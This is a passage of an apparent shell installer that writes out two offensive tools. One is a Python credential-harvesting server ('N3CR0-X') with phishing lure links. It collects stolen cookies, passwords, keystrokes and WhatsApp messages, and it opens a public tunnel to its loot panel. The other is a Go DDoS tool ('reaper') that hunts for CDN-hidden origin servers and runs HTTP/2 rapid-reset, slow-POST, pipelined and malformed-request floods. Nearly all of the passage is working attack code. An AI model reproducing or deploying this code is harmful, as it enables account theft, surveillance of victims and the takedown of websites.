body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
background:repeating-linear-gradient(0deg,rgba(45,230,198,.035) 0 1px,transparent 1px 3px)}
body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
background-image:linear-gradient(rgba(45,230,198,.05) 1px,transparent 1px),
linear-gradient(90deg,rgba(45,230,198,.05) 1px,transparent 1px);background-size:38px 38px}
header{display:flex;gap:14px;align-items:center;flex-wrap:wrap;padding:12px 16px;
background:linear-gradient(180deg,#0a1114,#070c0e);border-bottom:1px solid #14302c;
position:sticky;top:0;z-index:2}
.lg{width:46px;height:46px;flex:0 0 auto}
.brand{font-size:19px;letter-spacing:5px;font-weight:700;color:#4ff0c4}
.brand small{display:block;font-size:8.5px;letter-spacing:2.4px;color:#3f6b64;font-weight:400}
.stats{display:flex;gap:8px;flex-wrap:wrap;margin-left:auto}
.pill{border:1px solid #17403a;background:#081312;padding:4px 9px;border-radius:4px;font-size:10.5px;
color:#4ff0c4}.pill b{color:#ffe066}
nav{display:flex;gap:6px;flex-wrap:wrap;padding:9px 16px;background:#070c0e;border-bottom:1px solid #102622}
a.b{color:#4ff0c4;text-decoration:none;border:1px solid #17403a;padding:4px 10px;border-radius:4px;
font-size:11px;background:#081312}a.b:hover{background:#0d2422}
main{padding:12px 16px 60px}
.tg{border:1px solid #102622;border-left:2px solid #2de6c6;background:#070e10;padding:8px 10px;
margin-bottom:6px;border-radius:3px;font-size:11px}
.tg .h{color:#4ff0c4;font-weight:700;letter-spacing:1px}
.tg code{display:block;background:#04090a;border:1px solid #0f2320;padding:3px 7px;margin-top:4px;
border-radius:3px;color:#7fd8c6;word-break:break-all;cursor:pointer;font-size:10.5px}
.tg code b{color:#ffe066;font-weight:400}
table{border-collapse:collapse;width:100%;margin-top:12px;font-size:11.5px}
th{background:#081312;color:#3f6b64;text-align:left;padding:6px 8px;border-bottom:1px solid #14302c}
td{padding:6px 8px;border-bottom:1px solid #0b1a18;vertical-align:top}
tr:hover td{background:#08100f}
.v{display:inline-block;padding:1px 6px;border-radius:3px;font-size:10px;border:1px solid}
.cookie,.cookie-cdp,.cookie-lure,.storage-ls,.storage-ss,.storage-idb,.zap-chave,.zap-sessao
{color:#4ff0c4;border-color:#17403a;background:#081312}
.credencial,.credencial-lure{color:#ff6b8a;border-color:#3d1420;background:#180a10}
.s{color:#ffe066;word-break:break-all;max-width:400px;font-size:11px}
h2{color:#4ff0c4;font-size:13px;letter-spacing:2px;padding:10px 0 4px;border-bottom:1px solid #102622}
.msg{padding:7px 10px;border-bottom:1px solid #0b1a18;font-size:12px}
.msg b{color:#7fd8c6}.msg i{color:#3f6b64;font-size:10px}
.tx{color:#d7e8e2;background:#081312;border-left:2px solid #2de6c6;padding:5px 9px;
border-radius:3px;margin-top:4px;display:inline-block;max-width:90%;word-break:break-word}
input{background:#04090a;border:1px solid #14302c;color:#9fb3ad;padding:5px 9px;border-radius:3px;
font:inherit;font-size:11px}input:focus{outline:0;border-color:#2de6c6}
footer{position:fixed;bottom:0;left:0;right:0;background:#070c0e;border-top:1px solid #102622;
padding:5px 16px;font-size:10px;color:#2c4a45;letter-spacing:1.4px;display:flex;justify-content:space-between}"""

def page(b):
    return ("<!doctype html><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'>"
            "<title>N3CR0-X</title><style>" + CSS + "</style>" + b +
            "<footer><span>N3CR0-X // harvest suite</span><span id=clk></span></footer>"
            "<script>setInterval(function(){document.getElementById('clk').textContent="
            "new Date().toLocaleTimeString('pt-BR')},1000)</script>")

def head(token, title, stats, f=""):
    p = "".join(f"<div class=pill>{k} <b>{v}</b></div>" for k, v in stats)
    return (f"<header>{LOGO}<div class=brand>N3CR0-X<small>HARVEST SUITE</small></div>"
            f"<div class=stats>{p}</div></header>"
            f"<nav><a class=b href='/?t={token}'>loot</a><a class=b href='/teclas?t={token}'>teclas</a>"
            f"<a class=b href='/wa?t={token}'>zap</a><a class=b href='/w' target=_blank>parear</a>"
            f"<a class=b href='/export.csv?t={token}'>csv</a><a class=b href='/export.json?t={token}'>json</a>"
            f"<a class=b href='/report?t={token}'>relatório</a>"
            f"<form style='margin-left:auto'><input type=hidden name=t value='{token}'>"
            f"<input name=f placeholder='filtrar…' value='{f}'></form></nav><main>")

def reconstruct(rows):
    o = []
    for r in rows:
        k = r["k"]
        if k == "[\u232b]":
            if o: o.pop()
        elif k in ("[\u23ce]", "[\u21b9]"): o.append(" ")
        elif k.startswith("[colar:"): o.append(k[7:-1])
        else: o.append(k)
    return "".join(o)

def build_panel(token, f, base):
    sql, a = "SELECT * FROM loot", ()
    if f:
        sql += " WHERE vetor LIKE ? OR plataforma LIKE ? OR usuario LIKE ? OR host LIKE ?"
        a = (f"%{f}%",) * 4
    rs = q(sql + " ORDER BY id DESC LIMIT 3000")
    tot = q("SELECT COUNT(*) c FROM loot")[0]["c"]
    cr = q("SELECT COUNT(*) c FROM loot WHERE vetor LIKE 'credencial%'")[0]["c"]
    ks = q("SELECT COUNT(*) c FROM keys")[0]["c"]
    wm = q("SELECT COUNT(*) c FROM wa")[0]["c"]
    h = [head(token, "loot", [("itens", tot), ("cred", cr), ("teclas", ks), ("zap", wm)], f)]
    for t in q("SELECT * FROM targets ORDER BY ts DESC LIMIT 40"):
        h.append(f"<div class=tg><span class=h>{t['brand'].upper()} · {t['modo'].upper()}</span>"
                 f"<code data-c='{base}/l/{t['slug']}'>{base}/l/{t['slug']}</code>"
                 f"<code data-c='{base}/l/{t['slug']}?m=stay'>{base}/l/{t['slug']}<b>?m=stay</b></code>"
                 f"<code data-c='{base}/l/{t['slug']}?m=watch'>{base}/l/{t['slug']}<b>?m=watch</b></code></div>")
    h.append("<table><tr><th>#</th><th>vetor</th><th>plataforma</th><th>host</th><th>usuário</th>"
             "<th>segredo</th><th>ho</th><th>origem</th><th>data</th></tr>")
    for r in rs:
        h.append(f"<tr><td>{r['id']}</td><td><span class='v {r['vetor']}'>{r['vetor']}</span></td>"
                 f"<td>{html.escape(r['plataforma'] or '')}</td><td>{html.escape(r['host'] or '')}</td>"
                 f"<td>{html.escape(r['usuario'] or '')}</td>"
                 f"<td class=s>{html.escape((r['segredo'] or '')[:400])}</td>"
                 f"<td>{'•' if r['httponly'] else ''}</td><td>{r['browser']}</td><td>{r['ts']}</td></tr>")
    h.append("</table></main><script>document.querySelectorAll('code[data-c]').forEach(function(c){"
             "c.onclick=function(){navigator.clipboard&&navigator.clipboard.writeText(c.dataset.c)}})</script>")
    return page("".join(h))

def make_handler(token):
    from http.server import BaseHTTPRequestHandler

    class H(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"
        def log_message(self, *a): pass
        def out(self, code, body, ct="text/html; charset=utf-8", hdr=None):
            if isinstance(body, str): body = body.encode()
            self.send_response(code); self.send_header("Content-Type", ct)
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            for k, v in (hdr or {}).items(): self.send_header(k, v)
            self.end_headers()
            try: self.wfile.write(body)
            except Exception: pass
        def j(self, o): self.out(200, json.dumps(o), "application/json")
        def auth(self, qs):
            if qs.get("t", [""])[0] != token: self.out(401, "401"); return False
            return True
        def base(self):
            h = self.headers.get("Host") or ""
            if h and not h.startswith(("127.0.0.1", "localhost", "0.0.0.0")): return "https://" + h
            return PUBLIC["url"] or ("http://" + (h or "127.0.0.1:8080"))
        def do_GET(self):
            u = urlparse(self.path); p = u.path; qs = parse_qs(u.query)
            try:
                if p == "/":
                    if self.auth(qs): self.out(200, build_panel(token, qs.get("f", [""])[0], self.base()))
                elif p.startswith("/l/"):
                    t = q("SELECT * FROM targets WHERE slug=?", (p[3:],))
                    real = qs.get("r", [t[0]["real"] if t else ""])[0]
                    brand = t[0]["brand"] if t else qs.get("b", ["generic"])[0]
                    self.out(200, render(real, brand, host_of(real)),
                             hdr={"Referrer-Policy": "no-referrer"})
                elif p == "/l":
                    real = qs.get("r", [""])[0]
                    self.out(200, render(real, qs.get("b", ["generic"])[0], host_of(real)))
                elif p == "/w": self.out(200, WA_PAGE.replace("__WA__", WA_SVG))
                elif p == "/api/wa/qr": self.j({"qr": WA_STATE["qr"], "conectado": WA_STATE["conectado"]})
                elif p == "/teclas":
                    if not self.auth(qs): return
                    ss = q("SELECT sessao,host,plataforma,MIN(ts) t,COUNT(*) n FROM keys "
                           "GROUP BY sessao ORDER BY t DESC LIMIT 60")
                    h = [head(token, "teclas", [("sessões", len(ss))])]
                    for s in ss:
                        rr = q("SELECT k FROM keys WHERE sessao=? ORDER BY id", (s["sessao"],))
                        h.append(f"<div class=msg><b>{html.escape(s['plataforma'] or s['host'] or '')}</b> "
                                 f"<i>{s['t']} · {s['n']} eventos</i>"
                                 f"<div class=tx>{html.escape(reconstruct(rr)) or '(vazio)'}</div></div>")
                    self.out(200, page("".join(h) + "</main>"))
                elif p == "/wa":
                    if not self.auth(qs): return
                    ms = q("SELECT * FROM wa ORDER BY id DESC LIMIT 400")
                    h = [head(token, "zap", [("msgs", len(ms))])]
                    for m in ms:
                        h.append(f"<div class=msg><b>{html.escape(m['de'] or '')}</b> "
                                 f"<i>{html.escape(m['jid'] or '')} · {m['ts']} · {m['fonte']}</i>"
                                 f"<div class=tx>{html.escape(m['texto'] or '')}</div></div>")
                    self.out(200, page("".join(h) + "</main>"))
                elif p == "/export.csv":
                    if not self.auth(qs): return
                    rr = q("SELECT * FROM loot ORDER BY id"); b = io.StringIO()
                    if rr:
                        w = csv.DictWriter(b, fieldnames=rr[0].keys()); w.writeheader(); w.writerows(rr)
                    self.out(200, b.getvalue(), "text/csv",
                             {"Content-Disposition": "attachment; filename=loot.csv"})
                elif p == "/export.json":
                    if not self.auth(qs): return
                    self.out(200, json.dumps(q("SELECT * FROM loot ORDER BY id"),
                             ensure_ascii=False, indent=1), "application/json",
                             {"Content-Disposition": "attachment; filename=loot.json"})
                elif p == "/report":
                    if not self.auth(qs): return
                    rr = q("SELECT * FROM loot ORDER BY plataforma"); by = {}
                    for r in rr: by.setdefault(r["plataforma"], []).append(r)
                    h = [head(token, "relatório", [("itens", len(rr))])]
                    for k, its in sorted(by.items()):
                        h.append(f"<h2>{html.escape(k or '?')} ({len(its)})</h2><table>")
                        for i in its:
                            h.append(f"<tr><td>{html.escape(i['usuario'] or '')}</td>"
                                     f"<td class=s>{html.escape((i['segredo'] or '')[:300])}</td>"
                                     f"<td>{html.escape(i['host'] or '')}</td><td>{i['ts']}</td></tr>")
                        h.append("</table>")
                    self.out(200, page("".join(h) + "</main>"))
                else: self.out(404, "404")
            except Exception as e:
                self.out(500, f"erro: {e}")
        def do_POST(self):
            p = urlparse(self.path).path
            try:
                n = int(self.headers.get("Content-Length") or 0)
                d = json.loads(self.rfile.read(n) or b"{}")
            except Exception:
                return self.j({"ok": False})
            if p == "/api/lure":
                its = d.get("items", [])
                for i in its:
                    i.setdefault("browser", "lure"); i.setdefault("profile", self.client_address[0])
                    i.setdefault("plataforma", d.get("plataforma") or name_of(d.get("host", "")))
                return self.j({"ok": True, "n": save(its)})
            if p == "/api/keys":
                now = time.strftime("%Y-%m-%d %H:%M:%S")
                for i in d.get("items", []):
                    X("INSERT INTO keys(sessao,host,plataforma,alvo,k,ts) VALUES(?,?,?,?,?,?)",
                      (d.get("sessao","?"), d.get("host",""), d.get("plataforma",""),
                       i.get("alvo",""), i.get("k",""), now))
                return self.j({"ok": True})
            if p == "/api/wa/msg":
                X("INSERT INTO wa(jid,de,texto,ts,fonte) VALUES(?,?,?,?,?)",
                  (d.get("jid",""), d.get("de",""), d.get("texto",""),
                   time.strftime("%Y-%m-%d %H:%M:%S"), d.get("fonte","qr")))
                return self.j({"ok": True})
            self.out(404, "404")
    return H

def tunnel(port):
    try:
        p = subprocess.Popen(["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=45",
                              "-R",f"80:localhost:{port}","nokey@localhost.run"],
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in p.stdout:
            m = re.search(r"https://[a-z0-9-]+\.lhr\.life", line)
            if m and not PUBLIC["url"]:
                PUBLIC["url"] = m.group(0)
                print(f"\n[+] PAINEL: {PUBLIC['url']}/?t={open(TOKF).read().strip()}\n", flush=True)
    except Exception as e:
        print("[!] tunel:", e)

def main():
    a = sys.argv[1:]
    boot()
    if a and a[0] in ("stego", "unstego"):
        return stego(a[1], a[2]) if a[0] == "stego" else unstego(a[1])
    if a and a[0] == "harvest":
        m = a[1] if len(a) > 1 else "all"; t = 0
        fs = {"all": [harvest_cdp, harvest_root], "cdp": [harvest_cdp],
              "root": [harvest_root]}.get(m, [harvest_cdp, harvest_root])
        for f in fs:
            it, s = f(); t += save(it); print(f"[{f.__name__}] {s} -> {len(it)}")
        if m in ("all", "wa"):
            n1, s1 = wa_from_cdp(); n2, s2 = wa_from_root()
            print(f"[zap] cdp={s1}({n1}) disco={s2}({n2})"); t += n1 + n2
        return print(f"[+] total: {t}")
    if a and a[0] == "add":
        real = a[1]; brand = a[2] if len(a) > 2 and a[2] in BRANDS else "generic"
        modo = "stay" if "stay" in a else ("watch" if "watch" in a else "auto")
        slug = secrets.token_urlsafe(5).replace("-", "").replace("_", "")
        X("INSERT INTO targets VALUES(?,?,?,?,?)", (slug, real, brand, modo, time.strftime("%F %T")))
        return print(f"[+] /l/{slug} ({brand}/{modo})")
    from http.server import ThreadingHTTPServer
    port = 8080
    if "--port" in a: port = int(a[a.index("--port") + 1])
    token = open(TOKF).read().strip()
    if "--no-tunnel" not in a: threading.Thread(target=tunnel, args=(port,), daemon=True).start()
    if "wa" in a: threading.Thread(target=wa_boot, args=(port,), daemon=True).start()
    if "--stealth" in a: subprocess.run(["termux-wake-lock"], capture_output=True)
    srv = ThreadingHTTPServer(("127.0.0.1", port), make_handler(token))
    print(f"[*] local: http://127.0.0.1:{port}/?t={token}")
    try: srv.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] encerrado")
        if WA_STATE["proc"]: WA_STATE["proc"].terminate()
        subprocess.run(["termux-wake-unlock"], capture_output=True)

if __name__ == "__main__":
    main()
PY

  # ---------------------------------------------------------------- reaper
  cat > "$TOOLS/reaper.go" <<'GO'
package main

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2"
)

const version = "1.1"

var (
	reqCount, connCount, byteCount, errCount int64
	gHost, gSNI                              string
)

const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"

var reconClient = &http.Client{
	Timeout: 20 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConnsPerHost: 64,
		ForceAttemptHTTP2:   true,
	},
	CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}

func banner() {
	fmt.Print(`
   ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
   ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
   ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
   ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
   ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
       edge-side L7 reaper · v` + version + `
   h2 · hpack · rapid-reset · syn · pipeline · slowpost
`)
}

func randStr(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = alphabet[int(b[i])%len(alphabet)]
	}
	return string(b)
}

var uas = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
	"curl/8.10.1",
}

func randUA() string { return uas[rand.Intn(len(uas))] }

func isCDN(ip net.IP) string {
	s := ip.String()
	switch {
	case strings.HasPrefix(s, "104.16."), strings.HasPrefix(s, "104.17."),
		strings.HasPrefix(s, "104.18."), strings.HasPrefix(s, "104.19."),
		strings.HasPrefix(s, "104.20."), strings.HasPrefix(s, "104.21."),
		strings.HasPrefix(s, "104.22."), strings.HasPrefix(s, "104.23."),
		strings.HasPrefix(s, "172.64."), strings.HasPrefix(s, "172.65."),
		strings.HasPrefix(s, "172.66."), strings.HasPrefix(s, "172.67."),
		strings.HasPrefix(s, "188.114."), strings.HasPrefix(s, "162.159."),
		strings.HasPrefix(s, "173.245."), strings.HasPrefix(s, "103.21."),
		strings.HasPrefix(s, "103.22."), strings.HasPrefix(s, "103.31."),
		strings.HasPrefix(s, "197.234."), strings.HasPrefix(s, "198.41."),
		strings.HasPrefix(s, "2606:4700:"), strings.HasPrefix(s, "2803:f800:"),
		strings.HasPrefix(s, "2400:cb00:"), strings.HasPrefix(s, "2a06:98c0:"),
		strings.HasPrefix(s, "2c0f:f248:"):
		return "CLOUDFLARE"
	case strings.HasPrefix(s, "151.101."):
		return "FASTLY"
	case strings.HasPrefix(s, "185.199.108."), strings.HasPrefix(s, "185.199.109."),
		strings.HasPrefix(s, "185.199.110."), strings.HasPrefix(s, "185.199.111."):
		return "GITHUB-PAGES"
	case strings.HasPrefix(s, "13.32."), strings.HasPrefix(s, "13.224."),
		strings.HasPrefix(s, "52.84."), strings.HasPrefix(s, "54.230."),
		strings.HasPrefix(s, "143.204."), strings.HasPrefix(s, "99.84."):
		return "CLOUDFRONT"
	case strings.HasPrefix(s, "13.248."), strings.HasPrefix(s, "76.223."):
		return "AWS-ROUTE53"
	}
	return ""
}

func certMatches(ip, host string) bool {
	d := &net.Dialer{Timeout: 5 * time.Second}
	conn, err := tls.DialWithDialer(d, "tcp", net.JoinHostPort(ip, "443"),
		&tls.Config{ServerName: host, InsecureSkipVerify: true})
	if err != nil {
		return false
	}
	defer conn.Close()
	for _, c := range conn.ConnectionState().PeerCertificates {
		for _, n := range c.DNSNames {
			if strings.EqualFold(n, host) {
				return true
			}
		}
	}
	return false
}

func crtSubdomains(host string) []string {
	resp, err := reconClient.Get("https://crt.sh/?q=%25." + host + "&output=json")
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	var raw []struct {
		NameValue string `json:"name_value"`
	}
	if json.NewDecoder(resp.Body).Decode(&raw) != nil {
		return nil
	}
	set := map[string]bool{}
	for _, r := range raw {
		for _, n := range strings.Split(r.NameValue, "\n") {
			n = strings.TrimSpace(strings.TrimPrefix(n, "*."))
			if n != "" && !strings.EqualFold(n, host) {
				set[n] = true
			}
		}
	}
	out := make([]string, 0, len(set))
	for k := range set {
		out = append(out, k)
	}
	return out
}

func analyze(host string) {
	fmt.Println("=== ANALISE:", host, "===")
	ips, err := net.LookupIP(host)
	if err != nil {
		fmt.Println("[!] falha no DNS:", err)
	}
	tunnel := false
	for _, s := range []string{".localhost.run", ".lhr.life", ".ngrok.io", ".ngrok-free.app",
		".trycloudflare.com", ".serveo.net", ".pinggy.io", ".tunnelmole.net", ".bore.pub"} {
		if strings.HasSuffix(host, s) {
			tunnel = true
		}
	}
	if tunnel {
		fmt.Println("[*] DETECTADO: TUNEL. Origem nao existe, alvo e o edge + linha do host.")
	}
	for _, ip := range ips {
		if t := isCDN(ip); t != "" {
			fmt.Printf("  %-40s [%s]\n", ip, t)
		} else {
			fmt.Printf("  %-40s [IP PROPRIO]\n", ip)
		}
	}
	if nss, e := net.LookupNS(host); e == nil {
		for _, n := range nss {
			fmt.Println("  NS:", n.Host)
		}
	}
	if mxs, e := net.LookupMX(host); e == nil {
		for _, m := range mxs {
			fmt.Println("  MX:", m.Host)
		}
	}
	if txt, e := net.LookupTXT(host); e == nil {
		for _, t := range txt {
			fmt.Println("  TXT:", t)
		}
	}
	if tunnel {
		return
	}
	fmt.Println("[*] consultando crt.sh...")
	subs := crtSubdomains(host)
	fmt.Println("[*] subdominios:", len(subs))
	var mu sync.Mutex
	sem := make(chan struct{}, 48)
	var wg sync.WaitGroup
	for _, s := range subs {
		wg.Add(1)
		sem <- struct{}{}
		go func(s string) {
			defer wg.Done()
			defer func() { <-sem }()
			rips, e := net.LookupIP(s)
			if e != nil {
				return
			}
			for _, ip := range rips {
				tag := isCDN(ip)
				mark := ""
				if tag == "" {
					mark = " <== CANDIDATO"
					if certMatches(ip.String(), host) {
						mark = " <== ORIGEM CONFIRMADA"
					}
				}
				mu.Lock()
				fmt.Printf("  %-45s %-40s [%s]%s\n", s, ip, tag, mark)
				mu.Unlock()
			}
		}(s)
	}
	wg.Wait()
}

func dial(host string, port int, useTLS bool) (net.Conn, error) {
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	d := &net.Dialer{Timeout: 6 * time.Second}
	c, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	if tc, ok := c.(*net.TCPConn); ok {
		tc.SetNoDelay(true)
	}
	if useTLS {
		sni := gSNI
		if sni == "" {
			sni = host
		}
		tc := tls.Client(c, &tls.Config{ServerName: sni, InsecureSkipVerify: true,
			NextProtos: []string{"h2", "http/1.1"}})
		tc.SetDeadline(time.Now().Add(10 * time.Second))
		if err := tc.Handshake(); err != nil {
			c.Close()
			return nil, err
		}
		tc.SetDeadline(time.Time{})
		return tc, nil
	}
	return c, nil
}

func rstClose(c net.Conn) {
	type nc interface{ NetConn() net.Conn }
	if n, ok := c.(nc); ok {
		if t, ok := n.NetConn().(*net.TCPConn); ok {
			t.SetLinger(0)
		}
	} else if t, ok := c.(*net.TCPConn); ok {
		t.SetLinger(0)
	}
	c.Close()
}

func portOf(u *url.URL, def int) int {
	if p := u.Port(); p != "" {
		if v, err := strconv.Atoi(p); err == nil {
			return v
		}
	}
	return def
}

func normPath(u *url.URL) string {
	p := u.Path
	if p == "" || p == "/" {
		p = "/." + randStr(3)
	}
	return p
}

func hdrHost() string {
	if gHost != "" {
		return gHost
	}
	return gSNI
}

func h2Attack(u *url.URL, path string, conc, streams int, big, rapid bool, stop <-chan struct{}) {
	host := u.Hostname()
	port := portOf(u, 443)
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				conn, err := dial(host, port, true)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				tr := &http2.Transport{}
				cc, err := tr.NewClientConn(conn)
				if err != nil {
					conn.Close()
					continue
				}
				var wg sync.WaitGroup
				for i := 0; i < streams; i++ {
					wg.Add(1)
					go func() {
						defer wg.Done()
						ctx, cancel := context.WithCancel(context.Background())
						p := path + "/" + randStr(9)
						req, err := http.NewRequestWithContext(ctx, "GET", "https://"+vhost+p, nil)
						if err != nil {
							cancel()
							return
						}
						req.Host = vhost
						req.Header.Set("User-Agent", randUA())
						req.Header.Set("Accept", "*/*")
						if big {
							for k := 0; k < 64; k++ {
								req.Header.Set("x-b"+strconv.Itoa(k), randStr(6000))
							}
							req.Header.Set("Cookie", randStr(8000))
						}
						atomic.AddInt64(&reqCount, 1)
						if rapid {
							go func() {
								if resp, err := cc.RoundTrip(req); err == nil {
									resp.Body.Close()
								}
							}()
							cancel()
						} else {
							go func() {
								defer cancel()
								resp, err := cc.RoundTrip(req)
								if err == nil && resp != nil {
									n, _ := io.Copy(io.Discard, io.LimitReader(resp.Body, 16384))
									atomic.AddInt64(&byteCount, n)
									resp.Body.Close()
								}
							}()
						}
					}()
				}
				wg.Wait()
				if rapid {
					time.Sleep(1200 * time.Microsecond)
				}
				conn.Close()
			}
		}()
	}
}

func pipeFlood(host string, port int, useTLS bool, path string, conc, depth int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				c, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				var sb strings.Builder
				for i := 0; i < depth; i++ {
					sb.WriteString("GET " + path + "/" + randStr(6) + " HTTP/1.1\r\nHost: " + vhost +
						"\r\nUser-Agent: " + randUA() +
						"\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n")
				}
				c.SetWriteDeadline(time.Now().Add(10 * time.Second))
				if _, err := io.WriteString(c, sb.String()); err != nil {
					c.Close()
					continue
				}
				atomic.AddInt64(&reqCount, int64(depth))
				buf := make([]byte, 32768)
				c.SetReadDeadline(time.Now().Add(700 * time.Millisecond))
				for {
					n, err := c.Read(buf)
					if n > 0 {
						atomic.AddInt64(&byteCount, int64(n))
					}
					if err != nil {
						break
					}
				}
				rstClose(c)
			}
		}()
	}
}

func noReadFlood(host string, port int, useTLS bool, path string, conc int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				c, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				req := "GET " + path + "/" + randStr(8) + " HTTP/1.1\r\nHost: " + vhost +
					"\r\nUser-Agent: " + randUA() + "\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
				c.SetWriteDeadline(time.Now().Add(5 * time.Second))
				if _, err := c.Write([]byte(req)); err != nil {
					c.Close()
					continue
				}
				atomic.AddInt64(&reqCount, 1)
				select {
				case <-stop:
					rstClose(c)
					return
				case <-time.After(time.Duration(6+rand.Intn(10)) * time.Second):
					rstClose(c)
				}
			}
		}()
	}
}

func slowPost(host string, port int, useTLS bool, path string, conc int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				c, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				fmt.Fprintf(c, "POST %s/%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"+
					"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 100000000\r\n"+
					"Connection: keep-alive\r\n\r\n", path, randStr(6), vhost, randUA())
				dead := false
				for i := 0; i < 180 && !dead; i++ {
					select {
					case <-stop:
						c.Close()
						return
					case <-time.After(2 * time.Second):
					}
					c.SetWriteDeadline(time.Now().Add(3 * time.Second))
					if _, err := c.Write([]byte(randStr(1))); err != nil {
						dead = true
					}
					atomic.AddInt64(&reqCount, 1)
				}
				c.Close()
			}
		}()
	}
}

var malformedTemplates = []string{
	"GET %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 5\r\nContent-Length: 7\r\n\r\nAAAAAAA",
	"GET %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\nContent-Length: 99\r\n\r\n5\r\nAAAAA\r\n0\r\n\r\n",
	"GETT %s HTTP/1.1\r\nHost: %s\r\n\r\n",
	"GET %s HTTP/9.9\r\nHost: %s\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost: %s\r\nX-Sem-Dois-Pontos\r\nAccept: */*\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost:\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost: %s\r\nContent-Length: 999999999\r\n\r\n",
	"POST %s HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\nZZZ\r\n",
	"GET %s HTTP/1.0\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost: %s\r\nRange: bytes=0-1,2-3,5-8,13-\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost: %s\r\nAccept-Encoding: gzip, gzip, gzip, deflate, br, zstd, gzip\r\n\r\n",
	"GET %s HTTP/1.1\r\nHost: %s\r\nExpect: 100-continue\r\nContent-Length: 5000\r\n\r\n",
}

func malformedFlood(host string, port int, useTLS bool, path string, conc int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
				c, err := dial(host, port, useTLS)
				if err != nil {
					atomic.AddInt64(&errCount, 1)
					continue
				}
				atomic.AddInt64(&connCount, 1)
				tmpl := malformedTemplates[rand.Intn(len(malformedTemplates))]
				p := path + "/" + randStr(7)
				if rand.Intn(6) == 0 {
					p = path + "/" + randStr(3000+rand.Intn(6000))
				}
				c.SetWriteDeadline(time.Now().Add(3 * time.Second))
				c.Write([]byte(fmt.Sprintf(tmpl, p, vhost)))
				atomic.AddInt64(&reqCount, 1)
				buf := make([]byte, 2048)
				c.SetReadDeadline(time.Now().Add(1200 * time.Millisecond))
				n, _ := c.Read(buf)
				atomic.AddInt64(&byteCount, int64(n))
				rstClose(c)
			}
		}()
	}
}

func keepAliveFlood(host string, port int, useTLS bool, path string, conc int, post bool, bodySize int, stop <-chan struct{}) {
	vhost := hdrHost()
	for w := 0; w < conc; w++ {
		go func() {
			for {
				select {
				case <-stop:
					return
				default:
				}
